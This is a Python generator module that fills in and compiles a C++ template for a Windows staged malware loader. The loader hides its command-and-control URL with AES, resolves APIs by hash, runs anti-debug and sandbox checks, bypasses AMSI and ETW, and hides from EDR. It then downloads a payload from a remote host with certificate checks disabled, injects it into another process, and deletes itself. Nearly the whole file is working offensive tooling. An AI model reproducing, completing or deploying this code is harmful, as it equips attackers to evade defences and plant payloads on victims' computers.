import os
import random
import tempfile
from pathlib import Path
from urllib.parse import urlparse
from typing import Optional
from core.crypto import random_key, aes_cbc_encrypt, djb2_hash
from generators.base import BaseGenerator
from utils.helpers import colored_print

STAGED_LOADER_CPP = r'''#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdlib>
#include <ctime>

typedef void* HINTERNET;
typedef WORD INTERNET_PORT;

#include "syscalls.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscation.hpp"
#include "aes.hpp"

// __EXT_DEFS__
// __EXT_INCLUDES__

#define CFG_AD_TIMING __AD_TIMING__
#define CFG_AD_NTGLOBAL __AD_NTGLOBAL__
#define CFG_AD_HWBP __AD_HWBP__
#define CFG_AD_TRACER __AD_TRACER__
#define CFG_AD_SANDBOX __AD_SANDBOX__
#define CFG_AD_DELAYED __AD_DELAYED__
#define CFG_AD_DELAY_BASE __AD_DELAY_BASE__
#define CFG_AD_DELAY_JITTER __AD_DELAY_JITTER__
#define CFG_AD_API_HAMMER __AD_API_HAMMER__
#define CFG_AD_API_ROUNDS __AD_API_ROUNDS__
#define CFG_SD_ENABLED __SD_ENABLED__
#define CFG_SD_METHOD __SD_METHOD__
#define CFG_AMSI_ENABLE __AMSI_ENABLE__
#define CFG_SS_ENABLE __SS_ENABLE__
#define CFG_SS_DEPTH __SS_DEPTH__
#define CFG_SLEEP_ENABLED __SLEEP_ENABLED__
#define CFG_SLEEP_BASE __SLEEP_BASE__
#define CFG_SLEEP_JITTER __SLEEP_JITTER__
#define CFG_SLEEP_OBF __SLEEP_OBF__
#define CFG_SLEEP_ALGO __SLEEP_ALGO__
#define CFG_INJ_METHOD __INJ_METHOD__
#define CFG_TARGET_DLL __TARGET_DLL__
#define CFG_TARGET_PID __TARGET_PID__
#define CFG_KEY_LEN __KEY_LEN__

__PAYLOAD_DECL__

static const unsigned char _xor_mask[CFG_KEY_LEN]={__XOR_MASK__};
static const unsigned char _xor_masked[CFG_KEY_LEN]={__XOR_MASKED__};

static InjCtx _ctx;
static unsigned char _xor_key[CFG_KEY_LEN];

struct _WPI{
    DWORD dwAccessType;
    wchar_t* lpszProxy;
    wchar_t* lpszProxyBypass;
};

static const unsigned char _c2_url_enc[]={__C2_URL_ENC__};
static const unsigned char _c2_key[16]={__C2_KEY__};
static const unsigned char _c2_iv[16]={__C2_IV__};
#define __C2_URL_LEN__ __C2_LEN__

static void _z(WCHAR* d,const char* s,int m){
    for(int i=0;i<m;i++)d[i]=s[i];
}

__OBF_STRINGS__

__JUNK_FUNCS__

static void _derive_keys(){
    for(int i=0;i<CFG_KEY_LEN;i++)_xor_key[i]=_xor_mask[i]^_xor_masked[i];
    volatile unsigned char* v=(volatile unsigned char*)_xor_mask;
    for(int i=0;i<CFG_KEY_LEN;i++)v[i]=0;
}

static char* _decrypt_url(){
    uint8_t w[176];aegis::_ke(_c2_key,w);
    int plen=__C2_URL_LEN__;
    uint8_t* tmp=new uint8_t[plen];
    memcpy(tmp,_c2_url_enc,plen);
    uint8_t prev[16];memcpy(prev,_c2_iv,16);
    for(int i=0;i<plen;i+=16){
        uint8_t block[16];aegis::_dc(tmp+i,block,w);
        for(int j=0;j<16;j++){tmp[i+j]=block[j]^prev[j];}
        memcpy(prev,tmp+i,16);
    }
    int pad=tmp[plen-1];
    int rlen=plen-pad;
    char* r=new char[rlen+1];
    memcpy(r,tmp,rlen);r[rlen]=0;
    if(tmp){memset(tmp,0,plen);delete[] tmp;}
    return r;
}

#define SEC_FLAG_IGNORE_UNKNOWN_CA   0x100
#define SEC_FLAG_IGNORE_CN_INVALID   0x1000
#define SEC_FLAG_IGNORE_DATE_INVALID 0x2000
#define SEC_FLAG_IGNORE_WRONG_USAGE  0x200

static bool _http_download(const char* url,unsigned char** buf,DWORD* size,
    unsigned int timeout_sec,const char* proxy_addr,int proxy_port){
    void* hk=_getmod(_hash("winhttp.dll"));
    if(!hk)return false;

    typedef HINTERNET (__stdcall *tWo)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
    typedef HINTERNET (__stdcall *tWc)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
    typedef HINTERNET (__stdcall *tWr)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,DWORD);
    typedef BOOL (__stdcall *tWs)(HINTERNET,DWORD,LPCWSTR,DWORD,DWORD,DWORD);
    typedef BOOL (__stdcall *tWrr)(HINTERNET);
    typedef BOOL (__stdcall *tWrd)(HINTERNET,LPVOID,DWORD,LPDWORD);
    typedef BOOL (__stdcall *tWch)(HINTERNET);
    typedef BOOL (__stdcall *tWso)(HINTERNET,DWORD,LPVOID,DWORD);
    typedef BOOL (__stdcall *tWst)(HINTERNET,DWORD,DWORD,DWORD,DWORD);

    tWo _Wo=(tWo)_getapi(hk,_hash("WinHttpOpen"));
    tWc _Wc=(tWc)_getapi(hk,_hash("WinHttpConnect"));
    tWr _Wr=(tWr)_getapi(hk,_hash("WinHttpOpenRequest"));
    tWs _Ws=(tWs)_getapi(hk,_hash("WinHttpSendRequest"));
    tWrr _Wrr=(tWrr)_getapi(hk,_hash("WinHttpReceiveResponse"));
    tWrd _Wrd=(tWrd)_getapi(hk,_hash("WinHttpReadData"));
    tWch _Wch=(tWch)_getapi(hk,_hash("WinHttpCloseHandle"));
    tWso _Wso=(tWso)_getapi(hk,_hash("WinHttpSetOption"));
    tWst _Wst=(tWst)_getapi(hk,_hash("WinHttpSetTimeouts"));
    if(!_Wo||!_Wc||!_Wr||!_Ws||!_Wrr||!_Wrd||!_Wch||!_Wso)return false;

    HINTERNET ses=_Wo(__C2_UA__,0,0,0,0);
    if(!ses)return false;

    if(_Wst)_Wst(ses,timeout_sec*1000,timeout_sec*1000,timeout_sec*1000,timeout_sec*1000);

    DWORD tls=SEC_FLAG_IGNORE_UNKNOWN_CA|SEC_FLAG_IGNORE_CN_INVALID|
              SEC_FLAG_IGNORE_DATE_INVALID|SEC_FLAG_IGNORE_WRONG_USAGE;
    _Wso(ses,31,&tls,sizeof(tls));

    if(proxy_addr&&proxy_addr[0]&&proxy_port>0){
        _WPI pi={3,0,0};
        WCHAR pbuf[256];_z(pbuf,proxy_addr,255);
        pi.lpszProxy=pbuf;
        _Wso(ses,38,&pi,sizeof(pi));
    }

    int ulen=0;while(url[ulen])ulen++;
    wchar_t* wurl=new wchar_t[ulen+1];
    for(int i=0;i<ulen;i++)wurl[i]=url[i];
    wurl[ulen]=0;

    wchar_t* host=0;wchar_t* path=0;INTERNET_PORT port=443;
    wchar_t* p=wurl+7;
    while(*p&&*p!=L'/'&&*p!=L':')p++;
    int hlen=(int)(p-(wurl+7));
    host=new wchar_t[hlen+1];
    for(int i=0;i<hlen;i++)host[i]=wurl[7+i];
    host[hlen]=0;
    if(*p==L':'){p++;port=(INTERNET_PORT)_wtoi(p);while(*p&&*p!=L'/')p++;}
    int plen=0;wchar_t* pp=p;
    while(*pp){plen++;pp++;}
    path=new wchar_t[plen+1];
    for(int i=0;i<plen;i++)path[i]=p[i];
    path[plen]=0;

    HINTERNET con=_Wc(ses,host,port,0);
    if(!con){delete[] host;delete[] path;delete[] wurl;_Wch(ses);return false;}
    HINTERNET req=_Wr(con,L"GET",path,0,0,0);
    if(!req){delete[] host;delete[] path;delete[] wurl;_Wch(con);_Wch(ses);return false;}

    if(!_Ws(req,0,0,0,0,0)){
        delete[] host;delete[] path;delete[] wurl;
        _Wch(req);_Wch(con);_Wch(ses);return false;
    }
    if(!_Wrr(req)){
        delete[] host;delete[] path;delete[] wurl;
        _Wch(req);_Wch(con);_Wch(ses);return false;
    }

    DWORD total=0,read=0;
    unsigned char tmp[__DOWNLOAD_BUF__];
    *buf=(unsigned char*)VirtualAlloc(0,__MAX_PAYLOAD_SIZE__*1024*1024,MEM_COMMIT,__PERM_ALLOC__);
    if(!*buf){
        delete[] host;delete[] path;delete[] wurl;
        _Wch(req);_Wch(con);_Wch(ses);return false;
    }

    while(_Wrd(req,tmp,sizeof(tmp),&read)&&read>0){
        if(total+read>__MAX_PAYLOAD_SIZE__*1024*1024){
            VirtualFree(*buf,0,MEM_RELEASE);*buf=0;
            delete[] host;delete[] path;delete[] wurl;
            _Wch(req);_Wch(con);_Wch(ses);return false;
        }
        memcpy(*buf+total,tmp,read);
        total+=read;
    }
    *size=total;
    delete[] host;delete[] path;delete[] wurl;
    _Wch(req);_Wch(con);_Wch(ses);
    return true;
}

static bool _download_payload(unsigned char** buf,DWORD* size,DWORD timeout_sec){
    char* url=_decrypt_url();
    if(!url)return false;
    for(int retry=0;retry<__RETRY_COUNT__;retry++){
        if(_http_download(url,buf,size,timeout_sec,0,0)){delete[] url;return true;}
        Sleep(__RETRY_DELAY__*(retry+1));
    }
    delete[] url;
    return false;
}

int APIENTRY WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
    srand((unsigned)time(0));
    __JUNK_CALL__

    _derive_keys();

    if(CFG_AD_SANDBOX){if(_sandbox_check())return 1;}
    if(CFG_AD_DELAYED)_delayed_execution(CFG_AD_DELAY_BASE,CFG_AD_DELAY_JITTER);
    if(CFG_AD_API_HAMMER)_api_hammer(CFG_AD_API_ROUNDS);
    if(AntiDebug(CFG_AD_TIMING,CFG_AD_NTGLOBAL,CFG_AD_HWBP,CFG_AD_TRACER))return 1;
    _hide_edr();
    if(CFG_AMSI_ENABLE){_bypass_amsi();_bypass_etw();}
    _initsys();
    if(CFG_SS_ENABLE)_spoof_stack(CFG_SS_DEPTH);

    unsigned char* payload=0;
    DWORD payload_size=0;
    if(!_download_payload(&payload,&payload_size,__STAGE_TIMEOUT__))return 1;

    for(DWORD i=0;i<payload_size;i++)payload[i]^=_xor_key[i%CFG_KEY_LEN];

    _ctx.payload=payload;_ctx.len=payload_size;_ctx.xor_key=_xor_key;_ctx.key_len=CFG_KEY_LEN;
    Inject(&_ctx,CFG_INJ_METHOD,CFG_TARGET_DLL,CFG_TARGET_PID);

    volatile unsigned char* vx=(volatile unsigned char*)_xor_key;
    for(int i=0;i<CFG_KEY_LEN;i++)vx[i]=0;

    VirtualFree(payload,0,MEM_RELEASE);
    if(CFG_SD_ENABLED)_self_delete();
    return 0;
}
'''


class StagedGenerator(BaseGenerator):
    def generate(self) -> Optional[str]:
        colored_print("[+] Generating staged loader...", "green")

        url = self.profile.payload.url
        if not url:
            colored_print("[-] No C2 URL specified in profile", "red")
            return None

        parsed = urlparse(url)
        domain = parsed.hostname or "example.com"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        timeout = self.profile.payload.timeout_sec
        max_mb  = self.profile.payload.max_size_mb

        self.xor_key = random_key(16)

        colored_print(f"    Stage URL: {url}", "cyan")
        colored_print(f"    Download timeout: {timeout}s", "cyan")
        colored_print(f"    Max payload size: {max_mb}MB", "cyan")
        colored_print(f"    XOR key: {self.xor_key.hex()}", "cyan")

        c2_url = f"https://{domain}:{port}{parsed.path or '/payload.bin'}"
        c2_key = random_key(16)
        c2_iv = random_key(16)
        c2_url_enc = aes_cbc_encrypt(c2_url.encode(), c2_key, c2_iv)

        workdir = tempfile.mkdtemp(prefix="ol_")

        try:
            self._process_extensions()
            self._write_temp_source(workdir)

            ldr_content = STAGED_LOADER_CPP
            ldr_content = ldr_content.replace("__MAX_PAYLOAD_SIZE__", str(max_mb))
            ldr_content = ldr_content.replace("__C2_URL_ENC__", ', '.join(f'0x{b:02x}' for b in c2_url_enc))
            ldr_content = ldr_content.replace("__C2_KEY__", ', '.join(f'0x{b:02x}' for b in c2_key))
            ldr_content = ldr_content.replace("__C2_IV__", ', '.join(f'0x{b:02x}' for b in c2_iv))
            ldr_content = ldr_content.replace("__C2_LEN__", str(len(c2_url_enc)))
            ldr_content = ldr_content.replace("__C2_UA__", f'L"{self.profile.evasion.user_agent}"')
            ldr_content = ldr_content.replace("__RETRY_COUNT__", str(self.profile.evasion.retry_count))
            ldr_content = ldr_content.replace("__RETRY_DELAY__", str(self.profile.evasion.retry_delay_ms))
            ldr_content = ldr_content.replace("__DOWNLOAD_BUF__", str(self.profile.evasion.download_buf))
            ldr_content = ldr_content.replace("__STAGE_TIMEOUT__", str(self.profile.payload.timeout_sec))

            ldr_content = self._process_file(ldr_content)
            ldr_content = ldr_content.replace("__PAYLOAD_DECL__", "")

            (Path(workdir) / "loader.cpp").write_text(ldr_content)

            output_path = self.profile.output.path
            if not output_path:
                output_path = f"output/staged_loader_{os.urandom(4).hex()}.exe"

            if self._compile(workdir, output_path, self.profile.output.type):
                return output_path

        finally:
            import shutil
            shutil.rmtree(workdir, ignore_errors=True)

        return None
